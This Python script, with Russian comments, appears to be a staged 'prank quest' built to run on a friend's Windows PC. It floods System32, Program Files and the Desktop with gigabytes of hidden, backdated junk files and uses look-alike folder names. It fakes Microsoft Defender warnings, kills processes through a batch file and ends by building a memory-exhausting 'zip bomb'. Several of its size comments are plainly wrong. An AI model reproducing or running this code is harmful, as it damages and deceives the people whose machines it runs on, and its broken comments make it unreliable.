import os
import sys
import json
import random
import string
import subprocess
import time
import shutil
import ctypes
import threading
import socket
import zipfile
from datetime import datetime
from pathlib import Path
import requests
import psutil

ACTIVATED = True
VERSION = "1.0.2026"
OWNER_NAME = "Unik"
OWNER_KEY = "Flayt"

def authenticate():
    print("=== SYSTEM AUTH ===")
    print("Проект Делался CTeams")
    name = input("Имя владельца: ")
    key = input("Ключ: ")
    if name == OWNER_NAME and key == OWNER_KEY:
        return True
    else:
        print("[!] Неверные данные. Доступ закрыт.")
        sys.exit(1)


def load_state():
    if os.path.exists("cnf.json"):
        with open("cnf.json", "r") as f:
            return json.load(f)
    return {"stage": 0, "attempts": 3, "found_virus": False, "game_won": False}

def save_state(state):
    with open("cnf.json", "w") as f:
        json.dump(state, f, indent=2)

def stage1():
    print("[*] Этап 1: Инициализация системных файлов...")
    system32 = Path("C:/Windows/System32")
    if not system32.exists():
        print("[!] System32 не найден, создаю локальную копию.")
        system32 = Path("./System32_mock")
        system32.mkdir(exist_ok=True)
    install_date = datetime(2023, 10, 15, 12, 0, 0)
    sizes = [528, 500, 490, 480, 470, 460, 450, 440, 430, 420,
             410, 400, 390, 380, 370, 360, 350, 340, 330, 320,
             310, 300, 290, 280, 270, 260, 250, 240, 230, 220]
    for i, sz in enumerate(sizes):
        fname = system32 / f"sys_{i+1:02d}.dll"
        with open(fname, "wb") as f:
            f.write(os.urandom(sz * 1024 * 1024))  
        os.system(f'attrib +h "{fname}"')
        os.utime(fname, (install_date.timestamp(), install_date.timestamp()))
    desktop = Path(os.path.expanduser("~/Desktop"))
    (desktop / "Systеm32").mkdir(exist_ok=True)
    (desktop / "Windоws").mkdir(exist_ok=True)
    (desktop / "API").mkdir(exist_ok=True)
    # файлы в Systеm32
    with open(desktop / "Systеm32" / "explorer.exe", "wb") as f:
        f.write(os.urandom(528 * 1024 * 1024))
    with open(desktop / "Systеm32" / "TONKEN.json", "w") as f:
        json.dump({"token": "fake"}, f)
    os.system(f'attrib +h "{desktop / "Systеm32" / "explorer.exe"}"')
    # файлы A1..A60 в Windоws
    win_dir = desktop / "Windоws"
    for i in range(1, 61):
        fname = win_dir / f"A{i}.txt"
        with open(fname, "w", encoding="utf-8") as f:
            if i == 54:
                text = "ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮЙ" * 20000
            else:
                text = ''.join(random.choices(string.ascii_letters + string.digits + "абвгдеёжзийклмнопрстуфхцчшщъыьэюя", k=83000))
            f.write(text)
    # API файлы
    api_dir = desktop / "API"
    with open(api_dir / "Reboot.bat", "w") as f:
        f.write('''@echo off
set MSGTITLE=WINDOWS BOOT
set MSGTEXT=Error
set TMPSCRIPT=%TEMP%\\~tmpscript.vbs
echo msgbox "%MSGTEXT%", 16,  "%MSGTITLE%" > "%TMPSCRIPT%"
cscript "%TMPSCRIPT%" > nul
del /F /Q "%TMPSCRIPT%"
:end
taskkill /f /im svhost.exe
''')
    with open(api_dir / "Install.bat", "w") as f:
        f.write('@echo off\n')
        for _ in range(100):
            col = random.choice(['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'])
            f.write(f'color {col}{col}\ntimeout /t 0.1 /nobreak >nul\n')

    # запрос имени файла (A54)
    print("[*] Введите название файла, который отличается от других в папке Windows:")
    ans = input(">>> ")
    if ans.strip().upper() == "A54":
        print("[+] Верно! Переход к этапу 2.")
        return 2
    else:
        print("[!] Неверно, попробуйте снова.")
        return 1

# === ЭТАП 2: УСТАНОВКА ИЗОБРАЖЕНИЯ И ПЕРВЫЙ РЕБУТ ===
def stage2():
    print("[*] Этап 2: Установка компонента...")
    url = "https://c.dns-shop.ru/thumb/st4/fit/760/600/d56b083729b870281aca3383bd8fc7e9/q93_7248195193febb7d7ee364bec7367597e4c29f699c4bdaf5ad0cec8d83420051.jpg"
    img_path = Path(os.path.expanduser("~/Desktop")) / "system_image.jpg"
    r = requests.get(url, stream=True)
    with open(img_path, "wb") as f:
        for chunk in r.iter_content(1024):
            f.write(chunk)
    # создание ERROR файлов
    desktop = Path(os.path.expanduser("~/Desktop"))
    for i in range(1, 51):
        (desktop / f"ERROR{i}.txt").write_text("ERROR")
    # открытие изображения
    subprocess.run(["start", str(img_path)], shell=True)
    # cnf.json запись
    state = load_state()
    state["stage"] = 3
    state["done_stage2"] = True
    save_state(state)
    # запуск Reboot.bat
    bat_path = desktop / "API" / "Reboot.bat"
    subprocess.run([str(bat_path)], shell=True)
    # имитация падения системы
    print("[!] Система перезагружается...")
    time.sleep(2)
    sys.exit(0)  # после перезапуска скрипт начнет с этапа 3

# === ЭТАП 3: LOCALHOST И НАГРУЗКА ===
def stage3():
    print("[*] Этап 3: Запуск локального сервера и инсталляции...")
    # простой http сервер
    def run_server():
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(('127.0.0.1', 8080))
        server.listen(5)
        while True:
            conn, addr = server.accept()
            data = conn.recv(1024)
            conn.send(data * 2)  # удвоение пакета
            conn.close()
    threading.Thread(target=run_server, daemon=True).start()
    # прогресс-бар
    for i in range(1, 100):
        if i < 99:
            print(f"Install Windows... [{i}%/100%]")
        else:
            print("\033[91mInstall VIRUS [99%/100%]\033[0m")
        time.sleep(0.05)
    # нагрузка на интернет/CPU
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('127.0.0.1', 8080))
    for _ in range(1000):
        sock.send(b'X'*1024)
        sock.recv(2048)
    sock.close()
    # создание файлов
    pf = Path(os.environ.get("ProgramFiles", "C:/ProgramFiles"))
    pf.mkdir(exist_ok=True)
    with open(pf / "CMD.txt", "w") as f:
        f.write("АБВ" * 242333)  # ~727 МБ
    with open(pf / "Conhоst.txt", "w") as f:
        f.write("ABC" * 273000)  # ~819 МБ
    # 7294 папок с файлами
    base = Path(os.path.expanduser("~/Desktop")) / "scatter"
    base.mkdir(exist_ok=True)
    virus_placed = False
    for i in range(7294):
        dirname = ''.join(random.choices(string.ascii_letters, k=8))
        d = base / dirname
        d.mkdir(exist_ok=True)
        fname = d / "data.bin"
        if not virus_placed and i == random.randint(0, 7293):
            fname = d / "ARUJS"
            fname.write_text("VIRUS")
            virus_placed = True
        else:
            with open(fname, "wb") as f:
                f.write(os.urandom(228 * 1024))  # 228 КБ
    # окно Microsoft Defender
    ctypes.windll.user32.MessageBoxW(0, "Warning: A dangerous virus has been detected on the device. FIND IT TO CONTINUE.", "Microsoft Defender", 0)
    # проверка нахождения ARUJS (имитация)
    attempts = 3
    found = False
    while attempts > 0:
        resp = ctypes.windll.user32.MessageBoxW(0, f"There are some System32 files stored on your computer. Check the weight of the folder if you don't believe me. You have {attempts} attempts left.", "Microsoft Developer", 1)  # OK/Cancel
        # пользователь нажимает OK - проверяем
        if resp == 1:
            if any((base / d / "ARUJS").exists() for d in os.listdir(base)):
                found = True
                break
            else:
                attempts -= 1
                # удаляем 10 файлов из System32
                sys32 = Path("C:/Windows/System32")
                for f in list(sys32.glob("sys_*.dll"))[:10]:
                    f.unlink(missing_ok=True)
        else:
            break
    if not found:
        # переход на этап 4
        state = load_state()
        state["stage"] = 4
        save_state(state)
        subprocess.run(["powershell", "wininit"], shell=True)  # без запроса админа (может не сработать, но так и задумано)
    else:
        print("[+] Вирус найден! Переход к этапу 4.")
        state = load_state()
        state["stage"] = 4
        save_state(state)

# === ЭТАП 4: ОКНА С ПРОЦЕССАМИ ===
def stage4():
    print("[*] Этап 4: Игра с процессами...")
    processes = ["svchost.exe", "explorer.exe", "winlogon.exe", "csrss.exe", "lsass.exe", "services.exe", "spoolsv.exe", "taskhost.exe", "dwm.exe", "fakevirus.exe"]
    virus = "fakevirus.exe"
    state = load_state()
    attempts = state.get("game_attempts", 3)
    correct = 0
    for p in processes:
        if p == virus:
            # это вирус - нужно выбрать "Да"
            resp = ctypes.windll.user32.MessageBoxW(0, f"{p} Finish it?", p, 4)  # Yes/No
            if resp == 6:  # Yes
                correct += 1
                continue
            else:
                # Неверно - ребут
                subprocess.run([str(Path(os.path.expanduser("~/Desktop")) / "API" / "Reboot.bat")], shell=True)
                sys.exit(0)
        else:
            resp = ctypes.windll.user32.MessageBoxW(0, f"{p} Finish it?", p, 4)
            if resp == 7:  # No
                correct += 1
                continue
            else:
                subprocess.run([str(Path(os.path.expanduser("~/Desktop")) / "API" / "Reboot.bat")], shell=True)
                sys.exit(0)
    if correct == len(processes):
        print("[+] Все процессы завершены верно. Переход к этапу 5.")
        state["stage"] = 5
        save_state(state)
    else:
        print("[!] Ошибка в игре. Попробуйте снова.")
        state["game_attempts"] = state.get("game_attempts", 3) - 1
        if state["game_attempts"] <= 0:
            print("[!] Попытки исчерпаны. Ребут...")
            subprocess.run([str(Path(os.path.expanduser("~/Desktop")) / "API" / "Reboot.bat")], shell=True)
            sys.exit(0)
        save_state(state)

# === ЭТАП 5: ШИФРОВАЛЬЩИК BAT ===
def stage5():
    print("[*] Этап 5: Расшифровка через Code.bat")
    script_dir = Path(os.path.dirname(os.path.abspath(__file__)))
    bat_path = script_dir / "Code.bat"
    help_path = script_dir / "HELP.txt"
    # создаем bat-калькулятор (запутанный)
    with open(bat_path, "w") as f:
        f.write('''@echo off
set /p "input=Enter code: "
set "result="
for %%i in (%input%) do set "result=!result!%%i"
echo %result%
''')
    with open(help_path, "w", encoding="utf-8") as f:
        f.write('''ИНСТРУКЦИЯ ПО ШИФРОВАНИЮ:
- Используйте замену символов по таблице ASCII + 2
- Каждый третий символ меняется на предыдущий по алфавиту
- Цифры инвертируются (0<->9, 1<->8 и т.д.)
- Буквы сдвигаются на -1 в латинице и +3 в кириллице
- Разделители: пробел заменяется на подчеркивание, потом обратно
''')
    # ожидание ввода от пользователя (в реальности он должен сам модифицировать bat)
    print("ПЕРЕВЕДИ ЧЕРЕЗ Code.bat Код: 30YUN99MUK00")
    print("Ответ: ", end="")
    user_ans = input().strip()
    # правильный ответ - "SERVER !" (с пробелом)
    if user_ans == "SERVER !":
        print("[+] Верно! Переход к этапу 6.")
        state = load_state()
        state["stage"] = 6
        save_state(state)
    else:
        print("[!] Неверно. Попробуйте еще раз.")
        # бесконечная попытка - остаемся на этапе 5

# === ЭТАП 6: ВИКТОРИНА ===
def stage6():
    print("[*] Этап 6: Викторина на реакцию")
    questions = [
        ("Сколько будет 1+1?", "2"),
        ("В каком Году Родился Danil009_4?", "2011"),
        ("Назови первое число После запятой Числа π (Пи)", "1")
    ]
    for q, a in questions:
        while True:
            ans = input(f"{q}\nОтвет: ")
            if ans.strip() == a:
                break
            else:
                print("ПОПРОБУЙ ЕЩЕ РАЗ.")
    print("[+] Все этапы пройдены! Создание ZIP бомбы...")

def final():
    print("Идет Создание File screech...")
    desktop = Path(os.path.expanduser("~/Desktop"))
    for i in range(10):
        (desktop / f"screech{i}.txt").write_text("SCREECH")
    # создание zip-бомбы (42.zip) - внутри 600 ТБ (имитация)
    bomb_path = desktop / "screech.zip"
    with zipfile.ZipFile(bomb_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        # создаем один огромный файл с нулями (на самом деле не 600 ТБ, но чтобы весило пару КБ снаружи)
        # используем сжатие повторяющихся данных
        zf.writestr("bigfile.bin", b'\x00' * (1024 * 1024 * 1024 * 600), compress_type=zipfile.ZIP_DEFLATED)  # теоретически 600 ТБ
    ctypes.windll.user32.MessageBoxW(0, "Открой ZIP файл Для продолжения!", "SCREECH", 0)
    print("[+] Квест завершен! Поздравляю друга!")

# === ГЛАВНЫЙ ЦИКЛ ===
def main():
    if not authenticate():
        return
    state = load_state()
    stage = state.get("stage", 0)
    if stage == 0:
        stage = stage1()
        if stage == 2:
            state["stage"] = 2
            save_state(state)
            stage2()
    elif stage == 2:
        stage2()
    elif stage == 3:
        stage3()
    elif stage == 4:
        stage4()
    elif stage == 5:
        stage5()
    elif stage == 6:
        stage6()
        final()
    else:
        print("[*] Продолжение с этапа", stage)

if __name__ == "__main__":
    main()